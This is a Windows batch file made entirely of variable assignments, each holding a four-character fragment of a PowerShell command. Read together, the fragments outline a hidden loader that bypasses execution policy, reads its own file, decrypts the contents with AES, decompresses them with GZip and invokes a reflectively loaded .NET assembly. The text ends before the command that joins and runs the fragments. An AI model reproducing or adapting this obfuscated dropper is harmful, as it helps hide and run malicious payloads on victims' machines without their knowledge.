@echo off
set "pvuMbxVLNM=)($A"
set "DouJgtDKEq=ment"
set "bvsjxiAADk=;$nK"
set "cHxVegzUIu=v4Ir"
set "GeMjOaSvvV=isfL"
set "sDVpCSdfae=();$"
set "mQsFjtvPUN=736u"
set "DazALOBLso=3HWs"
set "hbBKQKMRkg=.-16"
set "mrUYzEBDwc= = $"
set "hAkYkDnZmE=Star"
set "KYSpvvhAYI=.Key"
set "WiXsDfDhNB=Stre"
set "omEXjIqQFO=ode]"
set "ORBghxbwiF=bypa"
set "BBzZaomogB=ose("
set "KQBlYCQlmL= if "
set "ayhiNsGMKy=yXRW"
set "oSrVJReIIy=, $n"
set "ngqVdqkyKI=and "
set "iNIthWnRMF=y.Cr"
set "MKooVOBHPK='dqR"
set "VSHlpdpDOm=7;$b"
set "liKEztzHGe=nHXs"
set "YaBjAOksQk=e = "
set "LCvtwYdxNC=Mode"
set "LxdDKfXGgl=uLd."
set "zzXTLbiWkq===')"
set "oeDuslKthL=J, 0"
set "wHUYYuDbgr=rans"
set "seDEeBBzqG=gMod"
set "oDKpLFagAh=-4] "
set "izkFfKXfOY=$fGw"
set "kpqxUsBYgG=yXRW"
set "FOCufIfPqn=;$tG"
set "geJAacCXID=Y.Su"
set "IlFlLQDWwc=ay()"
set "ErufxtAchc=wLzL"
set "YTVVWDMImI=comm"
set "QSnEzGdPkL= '')"
set "ixQVfhUDtA=ct S"
set "rtpnBfwsPj=; };"
set "GIyAyVNaZB=ddin"
set "cYLGhrGGHa=$byX"
set "eiYNtmWprf=ion."
set "GMshuLPxRE=TllA"
set "LhVqLwcrYl=$nHX"
set "JwSmrBzHhV=  $A"
set "KtHVvVEaDm=ptog"
set "wbXXfjXNRi=iron"
set "CMuItmnzLe=);$b"
set "YSxNBMTRHW=$fHu"
set "gJpSuRrccq=comp"
set "hoGHiWKOnZ=ress"
set "JmnYUuRsTn=m.IO"
set "gbHEuGQKlv=6] -"
set "wiNVCupFJY=New-"
set "FyYLFRvqEY=-1.."
set "DDSnVbpdTK=Disp"
set "ziaBddYjUS=-Obj"
set "GDaIDUZdhA= '')"
set "KNdoYLkZPE=Conv"
set "BBULPPJQxi=$UPo"
set "RSykiQvONE=m(, "
set "FnhAtSlOhJ=e]::"
set "NVtVdxYaiM=bjec"
set "vyJDPSGPzr=ddin"
set "FmDSvoOdfN=7Yiv"
set "PteDFsKZrR=);$b"
set "wthhsZIPCb=flec"
set "HJeAIQLkgF= New"
set "bJFaoPqHTG=yXRW"
set "pHWquepEEp=se()"
set "MDCGDzPITB=tion"
set "GLSlPUdzRx=('%*'"
set "fjtILArZEg=tem."
set "JcvXcMXzwa=yXRW"
set "wHpaYKNCiO=t Sy"
set "wGuSTHcYgj=W.Pa"
set "okHbVTsJra='[-1"
set "BPgVXcASZs=ne);"
set "pRUsYACHcj=Secu"
set "NztCMGzdMm=[Sys"
set "SeFZrYTddx=d = "
set "VQxQjqsSht= = $"
set "iyDXfBEKFq=ateD"
set "FRrFnCVEJV=sGUc"
set "TIAFSjBHyR=pose"
set "VbvEDvAIDK=sJ ="
set "BmIXobSUkA=+hAO"
set "dEGGvqYJFj=1] -"
set "jSdxfPKGMD=)) {"
set "snkTpqqyci=ZYYc"
set "bBFJbshCvq=ewLi"
set "VOEgejUaMh=onve"
set "bDUTgfsKOe=brea"
set "geGCuQRTqP= = N"
set "roNpezIOHo=.Cop"
set "dnfuIeumXX=form"
set "KgSRHzZiUF=ring"
set "xcmfQcPCZW=('%~f0'"
set "hwZYCVhRkT=]::("
set "KsjzrzfopO= [Sy"
set "TMSuBRkLch=.GZi"
set "KZlbIMfPoW=ress"
set "NchsMROMIc=KVPm"
set "aWkfqoLjIv=ing("
set "SzOkvzjRAP=J = "
set "iOPBHFdfOs=16] "
set "sGUVclDXTN=join"
set "TwAtWtjUSE=);$n"
set "aDwmppXmlT=[]] "
set "XTYTCLLIme=esMa"
set "ZsTmVZrSPv=.Com"
set "WFNaAnFEuo=S46e"
set "ZcdlWKfeih=grap"
set "ObgndDrnNl=sJ);"
set "VLtxuMTnQb=rity"
set "waCsqNNCNe=e = "
set "QrVvQgekIk=yXRW"
set "FMVXpofqSK=raph"
set "XhbjnFaHwl=..-1"
set "WzYKrsBTNN=bstr"
set "UyXQcuyPYX=Comp"
set "ENPfVIXIkc=vert"
set "rgJnWZvpaK=;$ZD"
set "RxnmfewAOZ=Obje"
set "cqsrHdDMhy=AwD."
set "SFHvtHuiUL=.Dis"
set "PumWFRBthB=qC);"
set "jZccqzVXox=trea"
set "AuYkztgLbf=WONO"
set "DzZOEoBwNc=pher"
set "ucIRjBwqhJ='')("
set "mbBjNrrRjw=zLY "
set "McQBWRikUJ=pose"
set "FIGqNWfZoL=fHuL"
set "iXlVCBCuYw=Fo7l"
set "zdNgjAdhvm=y.Ci"
set "SQKEtbVZFq=urit"
set "GfNjScnSLp=New-"
set "FgpfOCSlIb=WONO"
set "BlqVsawkSp=$lbg"
set "JuAJSSbxkB=]::("
set "TJlXilBVde=Comp"
set "hrlxybQtoV=-joi"
set "NeZyrLOMiW=morF"
set "tDcnoyUUiC=.Cry"
set "VRHhBSZOdE=join"
set "NzlYEayHeI=J = "
set "LweWoYPttz=ZDWa"
set "adIhAArwdo=esFX"
set "bUuPxgSYZi=n ''"
set "vKAaTVPXhI=[Sys"
set "GwkteACnyo=ss -"
set "rHuDdYYzWj=ect "
set "AzlmLPPMVc=Secu"
set "bKBCIdvvUc=HXsJ"
set "JryUKVnSNt== [S"
set "ZxRewiQvoS=.Mod"
set "DCRnyXBmiN=;$fH"
set "fFOQxAvBlT=daeR"
set "nTVFTfMhta=BC;$"
set "rVBfLqtPfZ=[Env"
set "hWQGjxRqcb=($wL"
set "tEogXiruup=File"
set "QdCEyTtpGa=ispo"
set "MIDPZWHuJl=byXR"
set "UuuyqWZsQU=em.C"
set "PMnoMqBLpk=UGTu"
set "oJMRgdZJkG=tryP"
set "sjVPIhIBfh=;$tG"
set "xbbgFjhleJ==');"
set "QmDDnuyRak=[Sys"
set "qIzNJWWCEJ=Disp"
set "mQGTuIGlch=gnir"
set "NPsPJdPWVH=();$"
set "BQICiycRWg=stem"
set "hLFRfCXcqw=le  "
set "NrwrAcniKZ=m.IO"
set "YKMxFwfnZy=ress"
set "UBDpZLPaIr=OyzA"
set "pXgOBivrzs=vj0m"
set "ifAQxdOSDk=Bmor"
set "GXKcByzthP=RW.I"
set "PHsLONGWZO=:('g"
set "ZSCLmWPCVb=lBlo"
set "qjrGPFWLDr=Gwne"
set "oGmlSRbdSD=yTo("
set "MGOPdcYXQE=rt]:"
set "RGpuckTEjM=k; }"
set "kdYXguRyZp=yste"
set "tVxbHuTdNj=]::C"
set "alGLJXctpg=..-1"
set "NjcqebKmPk=VPm."
set "ixVJoYGLbD=am;$"
set "AoMbeyukOp=WaH "
set "tkCzLXDPGb=] -j"
set "tezBAzDXdA=lit("
set "KqOLRDPlae=V = "
set "uPkkgLuWYP=UPoI"
set "hTdzkKYVfy=qC.T"
set "OmVigzTDmq=)))"
set "JBmyKBXfaq=::('"
set "YcBmfovTrr=saBm"
set "vKLAXNTrKi=embl"
set "QiIFcrUzeJ=d;$b"
set "TwEMGuTJtm=AwD "
set "KhpWPnDcHp=('l0"
set "VvlwmTWdFc=y]::"
set "EJATwSSbzL=$tGA"
set "kdjROPancz== $b"
set "nGMQSkHpsq=.Ass"
set "azOmxtqEiT=tem."
set "LtmRrfJxxw=nage"
set "YdhBIjUskA=[-1."
set "zRzyFMUABA=]::N"
set "VKVrkapBwK=O.Me"
set "cObjEnZZag=tem."
set "IZQqLIgzyM=Fina"
set "NvWjwVqAWF=ose("
set "UWkdLITtWi=.IO."
set "YfiNyoZQdW=Invo"
set "LgjfpUVZEV=oin "
set "ESTZORfdpD=ne.D"
set "oldmQBPADm=em.I"
set "DYbXtzCyvo=orF'"
set "HwFnQurKIx=).Sp"
set "hJxtYVcdEB=bgqC"
set "dZJEQagoDm=pStr"
set "qdDPMxZjgh=stem"
set "tNgoHcVknr=.Cre"
set "LDWlvVkOIK=rtS4"
set "dKNgjAGPBM=Ld, "
set "ugecrppBMO=ypto"
set "shgSoREsGp=);$l"
set "NnepuOdUQp=nirt"
set "MjWiRIksxK=ct S"
set "GxUxzKYAze=eam("
set "bqNyTqYkdO=oint"
set "lPeQjPWaJR=n ''"
set "xOIhJwRDnq=nHXs"
set "bYHzlkYeDv=.Dis"
set "XuTuBRMxWN=zLY."
set "WFnXYVWFkD=Iw ="
set "DzjJZAIFmc=$lbg"
